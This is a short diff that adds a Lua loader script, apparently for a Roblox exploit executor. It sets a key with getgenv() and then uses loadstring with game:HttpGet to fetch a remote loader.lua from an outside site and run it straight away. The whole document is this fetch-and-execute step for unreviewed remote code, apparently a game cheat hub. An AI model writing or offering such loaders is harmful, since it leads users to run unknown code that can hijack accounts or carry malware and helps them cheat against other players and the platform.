@@ -1,0 +1,3 @@
+getgenv().Key = "k66db05c0579323c623c84cc"
+
+loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
